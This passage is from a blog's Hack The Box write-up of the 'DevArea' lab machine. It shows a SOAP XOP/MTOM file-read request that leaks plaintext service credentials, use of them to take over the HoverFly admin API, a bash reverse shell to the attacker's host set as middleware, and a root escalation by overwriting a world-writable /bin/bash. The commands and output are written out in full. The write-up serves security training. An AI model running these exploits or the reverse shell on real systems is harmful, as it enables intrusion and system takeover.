+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~]</span><br><span class="line">└─$ curl -s -X POST <span class="string">&quot;http://10.129.21.82:8080/employeeservice&quot;</span> \</span><br><span class="line">  -H <span class="string">&#x27;Content-Type: multipart/related; type=&quot;application/xop+xml&quot;; start=&quot;&lt;root.message@cxf.apache.org&gt;&quot;; start-info=&quot;text/xml&quot;; boundary=&quot;----=_Part_1&quot;&#x27;</span> \</span><br><span class="line">  -d $<span class="string">&#x27;------=_Part_1\r\nContent-Type: application/xop+xml; charset=UTF-8; type=&quot;text/xml&quot;\r\nContent-Transfer-Encoding: 8bit\r\nContent-ID: &lt;root.message@cxf.apache.org&gt;\r\n\r\n&lt;soapenv:Envelope xmlns:soapenv=&quot;http://schemas.xmlsoap.org/soap/envelope/&quot; xmlns:dev=&quot;http://devarea.htb/&quot;&gt;\r\n   &lt;soapenv:Header/&gt;\r\n   &lt;soapenv:Body&gt;\r\n      &lt;dev:submitReport&gt;\r\n         &lt;arg0&gt;\r\n            &lt;employeeName&gt;&lt;xop:Include xmlns:xop=&quot;http://www.w3.org/2004/08/xop/include&quot; href=&quot;file:///etc/systemd/system/hoverfly.service&quot;/&gt;&lt;/employeeName&gt;\r\n            &lt;department&gt;IT&lt;/department&gt;\r\n            &lt;content&gt;test&lt;/content&gt;\r\n            &lt;confidential&gt;false&lt;/confidential&gt;\r\n         &lt;/arg0&gt;\r\n      &lt;/dev:submitReport&gt;\r\n   &lt;/soapenv:Body&gt;\r\n&lt;/soapenv:Envelope&gt;\r\n------=_Part_1--&#x27;</span></span><br><span class="line">&lt;soap:Envelope xmlns:soap=<span class="string">&quot;http://schemas.xmlsoap.org/soap/envelope/&quot;</span>&gt;&lt;soap:Body&gt;&lt;ns2:submitReportResponse xmlns:ns2=<span class="string">&quot;http://devarea.htb/&quot;</span>&gt;&lt;<span class="built_in">return</span>&gt;Report received from W1VuaXRdCkRlc2NyaXB0aW9uPUhvdmVyRmx5IHNlcnZpY2UKQWZ0ZXI9bmV0d29yay50YXJnZXQKCltTZXJ2aWNlXQpVc2VyPWRldl9yeWFuCkdyb3VwPWRldl9yeWFuCldvcmtpbmdEaXJlY3Rvcnk9L29wdC9Ib3ZlckZseQpFeGVjU3RhcnQ9L29wdC9Ib3ZlckZseS9ob3ZlcmZseSAtYWRkIC11c2VybmFtZSBhZG1pbiAtcGFzc3dvcmQgTzdJSjI3TXl5WGlVIC1saXN0ZW4tb24taG9zdCAwLjAuMC4wCgpSZXN0YXJ0PW9uLWZhaWx1cmUKUmVzdGFydFNlYz01ClN0YXJ0TGltaXRJbnRlcnZhbFNlYz02MApTdGFydExpbWl0QnVyc3Q9NQpMaW1pdE5PRklMRT02NTUzNgpTdGFuZGFyZE91dHB1dD1qb3VybmFsClN0YW5kYXJkRXJyb3I9am91cm5hbAoKW0luc3RhbGxdCldhbnRlZEJ5PW11bHRpLXVzZXIudGFyZ2V0Cg==. Department: IT. Content: <span class="built_in">test</span>&lt;/return&gt;&lt;/ns2:submitReportResponse&gt;&lt;/soap:Body&gt;&lt;/soap:Envelope&gt;</span><br></pre></td></tr></table></figure></div>
+
+<p>We extract the long base64 string from the response and decode it:</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~]</span><br><span class="line">└─$ <span class="built_in">echo</span> <span class="string">&quot;W1VuaXRdCkRlc2NyaXB0aW9uPUhvdmVyRmx5IHNlcnZpY2UKQWZ0ZXI9bmV0d29yay50YXJnZXQKCltTZXJ2aWNlXQpVc2VyPWRldl9yeWFuCkdyb3VwPWRldl9yeWFuCldvcmtpbmdEaXJlY3Rvcnk9L29wdC9Ib3ZlckZseQpFeGVjU3RhcnQ9L29wdC9Ib3ZlckZseS9ob3ZlcmZseSAtYWRkIC11c2VybmFtZSBhZG1pbiAtcGFzc3dvcmQgTzdJSjI3TXl5WGlVIC1saXN0ZW4tb24taG9zdCAwLjAuMC4wCgpSZXN0YXJ0PW9uLWZhaWx1cmUKUmVzdGFydFNlYz01ClN0YXJ0TGltaXRJbnRlcnZhbFNlYz02MApTdGFydExpbWl0QnVyc3Q9NQpMaW1pdE5PRklMRT02NTUzNgpTdGFuZGFyZE91dHB1dD1qb3VybmFsClN0YW5kYXJkRXJyb3I9am91cm5hbAoKW0luc3RhbGxdCldhbnRlZEJ5PW11bHRpLXVzZXIudGFyZ2V0Cg==&quot;</span> | <span class="built_in">base64</span> -d</span><br><span class="line">[Unit]</span><br><span class="line">Description=HoverFly service</span><br><span class="line">After=network.target</span><br><span class="line"></span><br><span class="line">[Service]</span><br><span class="line">User=dev_ryan</span><br><span class="line">Group=dev_ryan</span><br><span class="line">WorkingDirectory=/opt/HoverFly</span><br><span class="line">ExecStart=/opt/HoverFly/hoverfly -add -username admin -password O7IJ27MyyXiU -listen-on-host 0.0.0.0</span><br><span class="line"></span><br><span class="line">Restart=on-failure</span><br><span class="line">RestartSec=5</span><br><span class="line">StartLimitIntervalSec=60</span><br><span class="line">StartLimitBurst=5</span><br><span class="line">LimitNOFILE=65536</span><br><span class="line">StandardOutput=journal</span><br><span class="line">StandardError=journal</span><br><span class="line"></span><br><span class="line">[Install]</span><br><span class="line">WantedBy=multi-user.target</span><br></pre></td></tr></table></figure></div>
+
+<p>This is a huge find. The systemd service file reveals:</p>
+<ul>
+<li>The HoverFly service runs as user <strong><code>dev_ryan</code></strong> – this is the user we’ll land as when we get a shell.</li>
+<li>The admin credentials are passed in plaintext on the command line: <strong><code>admin:O7IJ27MyyXiU</code></strong></li>
+<li>HoverFly is listening on all interfaces (<code>0.0.0.0</code>), meaning we can reach both the proxy (port 8500) and the admin API (port 8888) from our attacker machine.</li>
+</ul>
+<h2 id="HoverFly-Authentication"><a href="#HoverFly-Authentication" class="headerlink" title="HoverFly Authentication"></a>HoverFly Authentication</h2><p>HoverFly’s Admin API at port 8888 requires authentication via JWT tokens. We use the credentials we extracted from the service file (<code>admin:O7IJ27MyyXiU</code>) to obtain a valid token by posting to the <code>/api/token-auth</code> endpoint.</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~]</span><br><span class="line">└─$ curl -s -X POST http://devarea.htb:8888/api/token-auth \</span><br><span class="line">  -H <span class="string">&quot;Content-Type: application/json&quot;</span> \</span><br><span class="line">  -d <span class="string">&#x27;&#123;&quot;username&quot;:&quot;admin&quot;,&quot;password&quot;:&quot;O7IJ27MyyXiU&quot;&#125;&#x27;</span></span><br><span class="line">&#123;<span class="string">&quot;token&quot;</span>:<span class="string">&quot;eyJhbGciOiJIUzUxMiIsInR5cCI6IkpXVCJ9.eyJleHAiOjIwODYxNDIwNTAsImlhdCI6MTc3NTEwMjA1MCwic3ViIjoiIiwidXNlcm5hbWUiOiJhZG1pbiJ9.v2zBmBW2O10ELDwQW7gZ42fA_l02tdVz56tktzhLNpFJPfijjRxD6mYkM3a4DUk4jzIGR5o0IkfrxPzm2YZoGQ&quot;</span>&#125;</span><br></pre></td></tr></table></figure></div>
+
+<p>We now have a valid JWT bearer token. This token will be used to authenticate all subsequent API requests to the HoverFly Admin API.</p>
+<h2 id="RCE-via-HoverFly-Middleware-GHSA-r4h8-hfp2-ggmf"><a href="#RCE-via-HoverFly-Middleware-GHSA-r4h8-hfp2-ggmf" class="headerlink" title="RCE via HoverFly Middleware (GHSA-r4h8-hfp2-ggmf)"></a>RCE via HoverFly Middleware (GHSA-r4h8-hfp2-ggmf)</h2><p>HoverFly has a “middleware” feature that allows administrators to define an external script that processes every request&#x2F;response pair passing through the proxy. The middleware is configured via the Admin API’s <code>/api/v2/hoverfly/middleware</code> endpoint, where you specify a <code>binary</code> (the interpreter) and a <code>script</code> (the code to execute).</p>
+<p>This is documented in the security advisory <strong>GHSA-r4h8-hfp2-ggmf</strong> – any authenticated user can set arbitrary commands as middleware, effectively achieving Remote Code Execution on the server. When the middleware is set, HoverFly immediately validates it by running a test request through it, which means our script gets executed as soon as we send the PUT request – no additional trigger is needed.</p>
+<p>First, we start a netcat listener on our attacker machine to catch the incoming reverse shell:</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~]</span><br><span class="line">└─$ nc -lvnp 4444</span><br><span class="line">listening on [any] 4444 ...</span><br></pre></td></tr></table></figure></div>
+
+<p>In a second terminal, we store the JWT token in a variable and send the PUT request to set a bash reverse shell as the middleware script. The <code>cat</code> at the end of the script is important – HoverFly expects the middleware to read JSON from stdin and write JSON to stdout, so <code>cat</code> passes the test input through while the reverse shell runs in the background:</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~]</span><br><span class="line">└─$ TOKEN=<span class="string">&quot;eyJhbGciOiJIUzUxMiIsInR5cCI6IkpXVCJ9.eyJleHAiOjIwODYxNDIwNTAsImlhdCI6MTc3NTEwMjA1MCwic3ViIjoiIiwidXNlcm5hbWUiOiJhZG1pbiJ9.v2zBmBW2O10ELDwQW7gZ42fA_l02tdVz56tktzhLNpFJPfijjRxD6mYkM3a4DUk4jzIGR5o0IkfrxPzm2YZoGQ&quot;</span></span><br><span class="line"></span><br><span class="line">┌──(kali㉿kali)-[~]</span><br><span class="line">└─$ curl -s -X PUT http://devarea.htb:8888/api/v2/hoverfly/middleware \</span><br><span class="line">  -H <span class="string">&quot;Authorization: Bearer <span class="variable">$TOKEN</span>&quot;</span> \</span><br><span class="line">  -H <span class="string">&quot;Content-Type: application/json&quot;</span> \</span><br><span class="line">  -d <span class="string">&#x27;&#123;&quot;binary&quot;:&quot;/bin/bash&quot;,&quot;script&quot;:&quot;#!/bin/bash\nbash -i &gt;&amp; /dev/tcp/10.10.16.178/4444 0&gt;&amp;1 &amp;\ncat&quot;&#125;&#x27;</span></span><br><span class="line">&#123;<span class="string">&quot;binary&quot;</span>:<span class="string">&quot;/bin/bash&quot;</span>,<span class="string">&quot;script&quot;</span>:<span class="string">&quot;#!/bin/bash\nbash -i &gt;\u0026 /dev/tcp/10.10.16.178/4444 0&gt;\u00261 \u0026\ncat&quot;</span>,<span class="string">&quot;remote&quot;</span>:<span class="string">&quot;&quot;</span>&#125;</span><br></pre></td></tr></table></figure></div>
+
+<p>HoverFly immediately validates the middleware by executing it, which triggers our reverse shell. Back on our netcat listener, we receive the connection:</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~]</span><br><span class="line">└─$ nc -lvnp 4444</span><br><span class="line">listening on [any] 4444 ...</span><br><span class="line">connect to [10.10.16.178] from (UNKNOWN) [10.129.21.82] 40160</span><br><span class="line">bash: cannot <span class="built_in">set</span> terminal process group (1454): Inappropriate ioctl <span class="keyword">for</span> device</span><br><span class="line">bash: no job control <span class="keyword">in</span> this shell</span><br><span class="line">dev_ryan@devarea:/opt/HoverFly$</span><br></pre></td></tr></table></figure></div>
+
+<p>We now have a shell as <code>dev_ryan</code> on the target machine.</p>
+<h2 id="User-Flag"><a href="#User-Flag" class="headerlink" title="User Flag"></a>User Flag</h2><p>With our shell as <code>dev_ryan</code>, we read the user flag from the home directory:</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">dev_ryan@devarea:/opt/HoverFly$ <span class="built_in">cat</span> /home/dev_ryan/user.txt</span><br><span class="line">725b467bddf22df46562080911f1a853</span><br></pre></td></tr></table></figure></div>
+
+<h2 id="Privilege-Escalation-world-writable-bin-bash-sudo-syswatch-sh"><a href="#Privilege-Escalation-world-writable-bin-bash-sudo-syswatch-sh" class="headerlink" title="Privilege Escalation - world-writable &#x2F;bin&#x2F;bash + sudo syswatch.sh"></a>Privilege Escalation - world-writable &#x2F;bin&#x2F;bash + sudo syswatch.sh</h2><p>Now we need to escalate from <code>dev_ryan</code> to <code>root</code>. The first thing to check is what sudo privileges this user has:</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">dev_ryan@devarea:/opt/HoverFly$ sudo -l</span><br><span class="line">Matching Defaults entries <span class="keyword">for</span> dev_ryan on devarea:</span><br><span class="line">    env_reset, mail_badpass, secure_path=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin, use_pty</span><br><span class="line"></span><br><span class="line">User dev_ryan may run the following commands on devarea:</span><br><span class="line">    (root) NOPASSWD: /opt/syswatch/syswatch.sh, !/opt/syswatch/syswatch.sh web-stop, !/opt/syswatch/syswatch.sh web-restart</span><br></pre></td></tr></table></figure></div>
+
+<p>This tells us that <code>dev_ryan</code> can run <code>/opt/syswatch/syswatch.sh</code> as root without a password. The <code>!</code> entries block the <code>web-stop</code> and <code>web-restart</code> arguments, but any other argument (like <code>--version</code>) is allowed. Since <code>syswatch.sh</code> is a bash script, when it runs as root via sudo, the system will invoke <code>/bin/bash</code> as root to interpret it.</p>
+<p>Next, we check the permissions on <code>/bin/bash</code>:</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">dev_ryan@devarea:/opt/HoverFly$ <span class="built_in">ls</span> -la /bin/bash</span><br><span class="line">-rwxrwxrwx 1 root root 1446024 Mar 31  2024 /bin/bash</span><br></pre></td></tr></table></figure></div>
+
+<p>This is the critical misconfiguration: <strong><code>/bin/bash</code> is world-writable</strong> (<code>-rwxrwxrwx</code>). This means any user on the system can replace the bash binary with their own script. Since <code>sudo /opt/syswatch/syswatch.sh</code> will invoke <code>/bin/bash</code> as root to interpret the script, if we replace <code>/bin/bash</code> with a malicious script, that script will execute as root.</p>
+<p>The exploitation plan:</p>
+<ol>
+<li>Back up the real <code>/bin/bash</code> to <code>/tmp/bash.bak</code> so we can use it as an interpreter and restore it later.</li>
+<li>Create an evil script (<code>/tmp/evil_bash</code>) that, when executed as root, copies the real bash to <code>/tmp/rootbash</code> and sets the SUID bit on it (allowing any user to run it with root privileges).</li>
+<li>Kill all running bash processes (to release the ETXTBSY lock on the binary, which prevents overwriting a file that’s currently being executed).</li>
+<li>Copy our evil script over <code>/bin/bash</code>.</li>
+<li>Run <code>sudo /opt/syswatch/syswatch.sh --version</code> – sudo will invoke the now-replaced <code>/bin/bash</code> as root, executing our evil script.</li>
+<li>Restore the original <code>/bin/bash</code> from our backup.</li>
+</ol>
+<p>First, we back up the real bash binary:</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dev_ryan@devarea:~$ <span class="built_in">cp</span> /bin/bash /tmp/bash.bak</span><br></pre></td></tr></table></figure></div>
+
+<p>Then we create the malicious script. Note the shebang line uses <code>/tmp/bash.bak</code> as the interpreter (since we’ll be replacing <code>/bin/bash</code> with this script, it needs a different interpreter):</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">dev_ryan@devarea:~$ <span class="built_in">cat</span> &gt; /tmp/evil_bash &lt;&lt; <span class="string">&#x27;EVIL&#x27;</span></span><br><span class="line"><span class="comment">#!/tmp/bash.bak</span></span><br><span class="line"><span class="built_in">cp</span> /tmp/bash.bak /tmp/rootbash</span><br><span class="line"><span class="built_in">chmod</span> 4755 /tmp/rootbash</span><br><span class="line">EVIL</span><br><span class="line"></span><br><span class="line">dev_ryan@devarea:~$ <span class="built_in">chmod</span> +x /tmp/evil_bash</span><br></pre></td></tr></table></figure></div>
+
+<p>Now we execute the entire attack chain using <code>/bin/sh</code> (not bash, since we’ll be killing bash processes). The <code>killall -9 bash</code> kills all running bash processes which releases the ETXTBSY file lock. After a short sleep to ensure the processes are dead, we copy our evil script over <code>/bin/bash</code>, then immediately run the sudo command which now executes our evil script as root:</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dev_ryan@devarea:~$ /bin/sh -c <span class="string">&#x27;killall -9 bash; sleep 2; cp /tmp/evil_bash /bin/bash; sudo /opt/syswatch/syswatch.sh --version; cp /tmp/bash.bak /bin/bash&#x27;</span></span><br></pre></td></tr></table></figure></div>
+
+<p>We verify that <code>/tmp/rootbash</code> was created with the SUID bit set and owned by root:</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">dev_ryan@devarea:~$ <span class="built_in">ls</span> -la /tmp/rootbash</span><br><span class="line">-rwsr-xr-x 1 root root 1446024 Apr  2 03:57 /tmp/rootbash</span><br></pre></td></tr></table></figure></div>
+
+<p>The <code>s</code> in <code>-rwsr-xr-x</code> confirms the SUID bit is set, and the file is owned by root. This means when any user executes <code>/tmp/rootbash -p</code> (the <code>-p</code> flag preserves the effective UID), they get a root shell:</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">dev_ryan@devarea:~$ /tmp/rootbash -p</span><br><span class="line">rootbash-5.2<span class="comment"># whoami</span></span><br><span class="line">root</span><br><span class="line">rootbash-5.2<span class="comment"># id</span></span><br><span class="line">uid=1001(dev_ryan) gid=1001(dev_ryan) euid=0(root) <span class="built_in">groups</span>=1001(dev_ryan)</span><br></pre></td></tr></table></figure></div>
+
+<p>We now have an effective UID of 0 (root).</p>
+<h2 id="Root-Flag"><a href="#Root-Flag" class="headerlink" title="Root Flag"></a>Root Flag</h2><p>With our root shell, we read the root flag:</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">rootbash-5.2<span class="comment"># cat /root/root.txt</span></span><br><span class="line">dd1039c0343af7bdd73cf5c30c3aded9</span><br></pre></td></tr></table></figure></div>
+
+<p>And that was it for DevArea! A fun chain going from an anonymous FTP download all the way to a decompiled SOAP LFI, a middleware RCE and a world-writable <code>/bin/bash</code> privesc. Hope you liked this writeup!</p>
+<p>-0xkujen</p>
+
+        </div>
+
+        
+            <div class="post-copyright-info px-2 sm:px-6 md:px-8">
+                <div class="article-copyright-info-container">
+    <ul>
+        <li><strong>Title:</strong> Hackthebox: DevArea</li>
+        <li><strong>Author:</strong> Foued SAIDI</li>
+        <li><strong>Created at
+                :</strong> 2026-07-05 12:00:00</li>
+        
+            <li>
+                <strong>Updated at
+                    :</strong> 2026-07-05 17:54:01
+            </li>
+        
+        <li>
+            <strong>Link:</strong> https://kujen5.github.io/2026/07/05/Hackthebox-DevArea/
+        </li>
+        <li>
+            <strong>
+                License:
+            </strong>
+            
+
+            
+                This work is licensed under <a class="license" target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0">CC BY-NC-SA 4.0</a>.
+            
+        </li>
+    </ul>
+</div>
+
+            </div>
+        
+
+        
+
+        
+
+        
+            <div class="article-nav my-8 flex justify-between items-center px-2 sm:px-6 md:px-8">
+                
+                
+                    <div class="article-next border-border-color shadow-redefine-flat shadow-shadow-color-2 rounded-medium px-4 py-2 hover:shadow-redefine-flat-hover hover:shadow-shadow-color-2">
+                        <a class="next"
+                        rel="next"
+                        href="/2026/07/03/Certified-Azure-Red-Team-Expert-CARTE-Review-%F0%9F%9A%80/"
+                        >
+                            <span class="title flex justify-center items-center">
+                                <span class="post-nav-title-item">Certified Azure Red Team Expert (CARTE) - Review 🚀</span>
+                                <span class="post-nav-item">Next posts</span>
+                            </span>
+                            <span class="right arrow-icon flex justify-center items-center">
+                                <i class="fa-solid fa-chevron-right"></i>
+                            </span>
+                        </a>
+                    </div>
+                
+            </div>
+        
+
+
+        
+    </div>
+
+    
+        <div class="toc-content-container">
+            <div class="post-toc-wrap">
+    <div class="post-toc">
+        <div class="toc-title">On this page</div>
+        <div class="page-title">Hackthebox: DevArea</div>
+        <ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#Overview"><span class="nav-text">Overview</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Reconnaissance"><span class="nav-text">Reconnaissance</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#FTP-Enumeration"><span class="nav-text">FTP Enumeration</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#JAR-Analysis"><span class="nav-text">JAR Analysis</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#LFI-via-XOP-MTOM-CVE-2022-46364"><span class="nav-text">LFI via XOP&#x2F;MTOM (CVE-2022-46364)</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#HoverFly-Authentication"><span class="nav-text">HoverFly Authentication</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#RCE-via-HoverFly-Middleware-GHSA-r4h8-hfp2-ggmf"><span class="nav-text">RCE via HoverFly Middleware (GHSA-r4h8-hfp2-ggmf)</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#User-Flag"><span class="nav-text">User Flag</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Privilege-Escalation-world-writable-bin-bash-sudo-syswatch-sh"><span class="nav-text">Privilege Escalation - world-writable &#x2F;bin&#x2F;bash + sudo syswatch.sh</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Root-Flag"><span class="nav-text">Root Flag</span></a></li></ol>
+
+    </div>
+</div>
+        </div>
+    
+</div>
+
+
+
+                
+
+            </div>
+
+            
+
+        </div>
+
+        <div class="main-content-footer">
+            <footer class="footer mt-5 py-5 h-auto text-base text-third-text-color relative border-t-2 border-t-border-color">
+    <div class="info-container py-3 text-center">
+        
+        <div class="text-center">
+            &copy;
+            
+              <span>2023</span>
+              -
+            
+            2026&nbsp;&nbsp;<i class="fa-solid fa-heart fa-beat" style="--fa-animation-duration: 0.5s; color: #f54545"></i>&nbsp;&nbsp;<a href="/">Foued SAIDI</a>
+        </div>
+        
+            <script data-swup-reload-script src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+            <div class="relative text-center lg:absolute lg:right-[20px] lg:top-1/2 lg:-translate-y-1/2 lg:text-right">
+                
+                    <span id="busuanzi_container_site_uv" class="lg:!block">
+                        <span class="text-sm">VISITOR COUNT</span>
+                        <span id="busuanzi_value_site_uv"></span>
+                    </span>
+                
+                
+                    <span id="busuanzi_container_site_pv" class="lg:!block">
+                        <span class="text-sm">TOTAL PAGE VIEWS</span>
+                        <span id="busuanzi_value_site_pv"></span>
+                    </span>
+                
+            </div>
+        
+        <div class="relative text-center lg:absolute lg:left-[20px] lg:top-1/2 lg:-translate-y-1/2 lg:text-left">
+            <span class="lg:block text-sm">POWERED BY <?xml version="1.0" encoding="utf-8"?><!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd"><svg class="relative top-[2px] inline-block align-baseline" version="1.1" id="圖層_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" width="1rem" height="1rem" viewBox="0 0 512 512" enable-background="new 0 0 512 512" xml:space="preserve"><path fill="#0E83CD" d="M256.4,25.8l-200,115.5L56,371.5l199.6,114.7l200-115.5l0.4-230.2L256.4,25.8z M349,354.6l-18.4,10.7l-18.6-11V275H200v79.6l-18.4,10.7l-18.6-11v-197l18.5-10.6l18.5,10.8V237h112v-79.6l18.5-10.6l18.5,10.8V354.6z"/></svg><a target="_blank" class="text-base" href="https://hexo.io">Hexo</a></span>
+            <span class="text-sm lg:block">THEME&nbsp;<a class="text-base" target="_blank" href="https://github.com/EvanNotFound/hexo-theme-redefine">Redefine v2.5.2</a></span>
+        </div>
+        
+        
+            <div>
+                Blog up for <span class="odometer" id="runtime_days" ></span> days <span class="odometer" id="runtime_hours"></span> hrs <span class="odometer" id="runtime_minutes"></span> Min <span class="odometer" id="runtime_seconds"></span> Sec
+            </div>
+        
+        
+            <script data-swup-reload-script>
+                try {
+                    function odometer_init() {
+                    const elements = document.querySelectorAll('.odometer');
+                    elements.forEach(el => {
+                        new Odometer({
+                            el,
+                            format: '( ddd).dd',
+                            duration: 200
+                        });
+                    });
+                    }
+                    odometer_init();
+                } catch (error) {}
+            </script>
+        
+        
+        
+    </div>  
+</footer>
+        </div>
+    </div>
+
+    
+        <div class="post-tools">
+            <div class="post-tools-container">
+    <ul class="article-tools-list">
+        <!-- TOC aside toggle -->
+        
+            <li class="right-bottom-tools page-aside-toggle">
+                <i class="fa-regular fa-outdent"></i>
+            </li>
+        
+
+        <!-- go comment -->
+        
+    </ul>
+</div>
+
+        </div>
+    
+
+    <div class="right-side-tools-container">
+        <div class="side-tools-container">
+    <ul class="hidden-tools-list">
+        <li class="right-bottom-tools tool-font-adjust-plus flex justify-center items-center">
+            <i class="fa-regular fa-magnifying-glass-plus"></i>
+        </li>
+
+        <li class="right-bottom-tools tool-font-adjust-minus flex justify-center items-center">
+            <i class="fa-regular fa-magnifying-glass-minus"></i>
+        </li>
+
+        <li class="right-bottom-tools tool-dark-light-toggle flex justify-center items-center">
+            <i class="fa-regular fa-moon"></i>
+        </li>
+
+        <!-- rss -->
+        
+
+        
+
+        <li class="right-bottom-tools tool-scroll-to-bottom flex justify-center items-center">
+            <i class="fa-regular fa-arrow-down"></i>
+        </li>
+    </ul>
+
+    <ul class="visible-tools-list">
+        <li class="right-bottom-tools toggle-tools-list flex justify-center items-center">
+            <i class="fa-regular fa-cog fa-spin"></i>
+        </li>
+        
+            <li class="right-bottom-tools tool-scroll-to-top flex justify-center items-center">
+                <i class="arrow-up fas fa-arrow-up"></i>
+                <span class="percent"></span>
+            </li>
+        
+        
+    </ul>
+</div>
+
+    </div>
+
+    <div class="image-viewer-container">
+    <img src="">
+</div>
+
+
+    
+
+</main>
+
+
+    
+<script src="/js/libs/Swup.min.js"></script>
+
+<script src="/js/libs/SwupSlideTheme.min.js"></script>
+
+<script src="/js/libs/SwupScriptsPlugin.min.js"></script>
+
+<script src="/js/libs/SwupProgressPlugin.min.js"></script>
+
+<script src="/js/libs/SwupScrollPlugin.min.js"></script>
+
+<script src="/js/libs/SwupPreloadPlugin.min.js"></script>
+
+<script>
+    const swup = new Swup({
+        plugins: [
+            new SwupScriptsPlugin({
+                optin: true,
+            }),
+            new SwupProgressPlugin(),
+            new SwupScrollPlugin({
+                offset: 80,
+            }),
+            new SwupSlideTheme({
+                mainElement: ".main-content-body",
+            }),
+            new SwupPreloadPlugin(),
+        ],
+        containers: ["#swup"],
+    });
+</script>
+
+
+
+
+
+
+
+<script src="/js/tools/imageViewer.js" type="module"></script>
+
+<script src="/js/utils.js" type="module"></script>
+
+<script src="/js/main.js" type="module"></script>
+
+<script src="/js/layouts/navbarShrink.js" type="module"></script>
+
+<script src="/js/tools/scrollTopBottom.js" type="module"></script>
+
+<script src="/js/tools/lightDarkSwitch.js" type="module"></script>
+
+<script src="/js/layouts/categoryList.js" type="module"></script>
+
+
+
+
+
+    
+<script src="/js/tools/codeBlock.js" type="module"></script>
+
+
+
+
+    
+<script src="/js/layouts/lazyload.js" type="module"></script>
+
+
+
+
+    
+<script src="/js/tools/runtime.js"></script>
+
+    
+<script src="/js/libs/odometer.min.js"></script>
+
+    
+<link rel="stylesheet" href="/assets/odometer-theme-minimal.css">
+
+
+
+
+  
+<script src="/js/libs/Typed.min.js"></script>
+
+  
+<script src="/js/plugins/typed.js" type="module"></script>
